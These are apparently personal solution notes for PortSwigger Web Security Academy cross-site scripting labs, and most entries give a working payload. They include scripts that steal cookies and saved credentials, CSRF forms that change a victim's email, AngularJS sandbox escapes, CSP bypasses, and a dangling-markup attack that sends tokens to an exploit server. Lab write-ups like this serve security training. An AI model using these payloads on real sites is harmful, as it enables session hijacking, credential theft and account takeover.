# Reflected
1. This lab has a XSS vulnerability in the search term, which gets reflected in the `search` GET parameter. This lab can be solved by searching for `<script>alert()</script>`

# Stored
1. This lab has a XSS vulnerability in the post comment functionality. This lab can be solved by submitting a comment with the contents `<script>alert()</script>`

# DOM
1. This lab has a XSS vulnerability where the search term was being injected into an image's `src` attribute using the `document.write` function. As such, the lab could be solved by escaping the image tag and injecting a script as follows: `"><script>alert()</script>`
2. This lab has a XSS vulnerability where product pages search for a `storeId` GET parameter and places its value inside an `option` tag if it is provided. As such, adding the following payload to the end of a product page triggers the XSS: `</option><script>alert()</script>`
3. This lab has XSS in the search functionality where the search term is retrieved from the URL and placed within the search result title using the `innerHtml` attribute. As such, this can be exploited using a payload such as `<img src=x onerror=alert()>`
4. This lab has XSS on the feedback page where the `href` attribute of the back link is set dynamically using jQuery's `attr` function with the `returnPath` GET parameter. As such, the following value in the URL causes the back link to alert the page cookies: `?returnPath=javascript:alert(document.cookie)`
5. This lab has XSS where jQuery attempts to focus on an element from the `hashchange` event. This can be triggered with controlled values from an iframe in order to achieve XSS as follows: `<iframe src="https://ac501faa1e93962ec05e556f002700d9.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'">` (Note, this exploit will repeatedly open up the page print dialog)
6. This lab has XSS due to AngularJS' `ng-app` directive. On the search page, user input is reflected within an `ng-app` context and as such can be interpreted as an angular directive if placed within double curly braces. As such, searching for the following will trigger XSS: `{{$on.constructor('alert(1)')()}}`
7. This lab has XSS where the search term is reflected back from the server, then used in an `eval` call. The reflected string is enclosed within a JSON value and quotes are being escaped, but backslashes are not. As such, the following search will trigger the XSS: `\"};alert()//`
8. This lab has XSS where the server stores unsanitized versions of the comments and they are loaded onto the page using `innerHtml`. While the values are passed through a sanitization function, the sanitization improperly uses the javascript `replace` function without the global flag. As a result, on the first instances of `<` and `>` are escaped and a working payload is something such as `<><img src=x onerror=alert()>`

# Exploiting XSS
1. This lab has XSS in the comment body field. It is meant to be solved by exfiltrating `document.cookie` and changing the cookie in order to hijack another user's session, but I cannot do this without having Burp Professional. Instead, I had to perform CSRF via XSS in order to make a payload that causes victims to make a comment with their cookies in it. It is worth noting that the lab does properly use CSRF tokens, but XSS can be used to get around that issue. The payload is the following:
```
<form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded" id="csrf">
<input type="hidden" name="csrf" id="csrf_token">
<input type="hidden" name="postId" value="1">
<input type="hidden" rows="12" cols="300" name="comment" id="csrf_value"></textarea>
<input type="hidden" type="text" name="name" value="name">
<input type="hidden" type="email" name="email" value="email@email.com">
</form>
<script>
var csrf_token = "";
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://acde1fff1f2f5b60c035a8fd000f0009.web-security-academy.net/login', false);
xhr.onload = function () {
	if (xhr.readyState === xhr.DONE) {
		if (xhr.status === 200) {
			csrf_token = /name="csrf" value="([^"]+)"/.exec(xhr.responseText)[1];
		}
	}
};
xhr.send(null);
document.getElementById('csrf_token').value = csrf_token;
document.getElementById('csrf_value').value = document.cookie;
document.getElementById('csrf').submit();
</script>
```
2. This lab has XSS in the comment body field, and is meant to be solved by using this vulnerability to take advantage of the administrator's password manager in order to steal their credentials. This is supposed to be done using Burp Collaborator, but I don't have Burp Professional and as such had to use an additional CSRF in order to cause the administrator to post their credentials in a comment. The following payload causes the credentials to be posted to the post with ID 1:
```
<script>
function csrf() {
	document.getElementsByName('comment')[0].value = document.getElementById('username').value + ':' + document.getElementById('password').value;
	document.getElementsByName('postId')[0].value = 1;
	document.getElementsByName('name')[0].value = 'asdf';
	document.getElementsByName('email')[0].value = 'asdf@asdf.asdf';
	document.getElementsByName('email')[0].parentElement.submit();
}
</script>
<form>
<input type="text" name="username" id="username">
<input type="password" id="password" name="password" onchange=csrf()>
</form>
```
3. This lab has XSS in the comment body field, and the goal is to use XSS to perform a CSRF attack that changes the email account of any user who views the comment. The following payload performs the attack:
```
<form action="/my-account/change-email" method="POST" id="csrf">
	<input required type="email" name="email" value="fake@attacker.com">
	<input required type="hidden" name="csrf" value="h0a6EGVkgXEuBUPzqmvEL4C5lsoWVx2z" id="csrf_token">
</form>
<script>
var csrf_token = "";
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://ac651fe71e91f168c0fd0e85005200e2.web-security-academy.net/login', false);
xhr.onload = function () {
	if (xhr.readyState === xhr.DONE) {
		if (xhr.status === 200) {
			csrf_token = /name="csrf" value="([^"]+)"/.exec(xhr.responseText)[1];
		}
	}
};
xhr.send(null);
document.getElementById('csrf_token').value = csrf_token;
document.getElementById('csrf').submit();
</script>
```

# Contexts
1. This lab has reflected XSS in the search function, but blocks most tags. The allowed tags and events can be enumerated, resulting in finding the payload `<body onresize=print()>`. This results in the following iframe payload to trigger the XSS automatically: `<iframe src="https://ac111ff91f9e16e7c03d6844006d001a.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width='100px'">`
2. This lab has reflected XSS, but blocks all non-custom tags. As such, we must create a custom tag with an `onfocus` event listener and cause it to receive focus without user interaction. This can be done via the following iframe payload: `<iframe src="https://ace21fb51f3cd41bc0fc50c9003500ac.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabIndex%3D1%3E%3C%2Fxss%3E#x">`
3. Already solved
4. Already solved
5. This lab has reflected XSS in the search bar, but blocks event triggers and the `href` attribute for links. This can be bypassed, however, by using an svg animation to dynamically set the disallowed `href` attribute. The following payload creates a SVG with a link that executes javascript on click: `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>`
6. This lab has reflected XSS that blocks most common tags, but misses some SVG tags. As such, the following payload can be used to execute javascript: `<svg><animatetransform onbegin=alert() /></svg>`
7. This lab has reflected XSS where angle brackets are correctly encoded, and as such new HTML tags cannot be injected. As such, the payload must inject a malicious attribute into an existing tag, in this case the `input` field. The following payload will trigger an alert when then input field is moused over (user interaction is required just to prevent infinite looping): `"onmouseover=alert() x="`
8. This lab has stored XSS where a malicious website link can cause XSS when a user clicks on a commenter's name. This can be exploited by submitting the following payload for the website field when creating a new comment: `javascript:alert()`
9. This lab reflects user input into a `canonical` `link` tag. This leads to reflected XSS, by going to the following endpoint: `/?'accesskey='x'onclick='alert()'x='`
10. This lab reflects user input into a javascript string and escapes quotes. However, due to the order to HMTL/javascript parsing, the entire script can be escaped by simply putting a `</script>` tag. This leads to the following payload: `</script><img src=x onerror=alert()>`
11. This lab has the same issue as before, but does not escape quotes. As such, the following payload can be used to execute javascript without breaking the string literal that it is injected into: `'-alert()-'`
12. This lab is the same as above, but it prepends single quotes with a `\` character. However, it does not escape backslashes as well, so an additional backslash can be used in order to escape the one that will be injected. This results in the following payload: `\';alert()//`
13. This lab has user input get reflected into some javascript within the `Back to Blog` link at the bottom of the page. However, there is a strict character filter in place. As an example, spaces are not allowed, but empty comments (`/**/`) can be used to emulate them. The attack can be triggered by navigating to the following address: `/post?postId=5&%27%7D,x=x=>%7Bthrow/**/onerror=alert,1%7D,toString=x,window%2b%27%27,%7Bx:%27`
14. This lab reflects the comments website within a javascript string and escapes single quotes. This can be avoided, however, due to the ordering of HTML vs javascript interpretation. More specifically, by HTML encoding single quotes within a javascript string, they will be decoded before the javascript is parsed. This results in bypassing the filter that escapes them, allowing for XSS. The following payload can be used to match the required website format: `http://asdf?&apos;-alert()-&apos;`
15. This lab has reflected XSS where the search term is reflected within a javascript template literal. While various quotes, brackets, etc are escaped, the injection being within a template literal means that it doesn't even need to be escaped. As such, the following search term will trigger the XSS: `${alert()}`

# AnglarJS Sandbox
1. This lab has an AngularJS sandbox escape, but blocks quotes of any kind. The overall goal of exploiting this is to generate a string without using quotes using the `toString()` method, using the DOM to access the `String` prototype, and override the `charAt` function to bypass the sandbox. Navigating to the following page results in the exploit being triggered: `/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,41)=1`
2. This lab also has a sandbox escape, but additionally employs an AngularJS CSP and has a character maximum for search terms. Using the following script on the provided exploit server can bypass all of the restrictions, triggering an alert containing `document.cookie`:
```
<script>
document.location = 'https://ac401f541f16a255c07861f0009300dd.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

# CSP
1. This lab cannot be done without using Burp Professional
2. This lab reflects the GET parameter `token` into the CSP, allowing for the injection of new policies. While the `script-src` directive is set and cannot be overriden, the `script-src-elem` element was not set. As such, visiting the following endpoint sets the CSP directive `script-src-elem 'unsafe-inline'` and executes an alert: `/?search=<script>alert()</script>&token=;script-src-elem 'unsafe-inline'`

# Dangling Markup
1. This lab has an XSS vulnerability but is protected by CSP. However, by setting a value for the email we can insert HTML tags and cause a dangling markup attack. This attack can be automated with the following script on the exploit server:
```
<script>
if(window.name) {
	new Image().src='https://exploit-ac891fb81f94e06cc19705970167009c.web-security-academy.net/extract?e='+encodeURIComponent(window.name);
} else {
	location = "https://ac5f1f461f81e071c19805190034002a.web-security-academy.net/my-account?email=\"><a href='https://exploit-ac891fb81f94e06cc19705970167009c.web-security-academy.net/exploit'>Click me</a><base target='";
}
</script>
```
This exploit will take the user to their account page with a `Click me` link in the email form. When that link is clicked, the victim's browser will send a request to the attacker's server which includes their CSRF token. From there, the above script can be replaced with the following simple CSRF payload to use the victim's CSRF token and change their email address:
```
<form action="https://ac5f1f461f81e071c19805190034002a.web-security-academy.net/my-account/change-email" method="POST">
                            <input required="" type="email" name="email" value="fake@attacker.com">
                            <input required="" type="hidden" name="csrf" value="GjdQmAA7vWTFbZ2mGOvDtX3rDZ9LUkpE">
                        </form>
<script>
document.forms[0].submit();
</script>
```
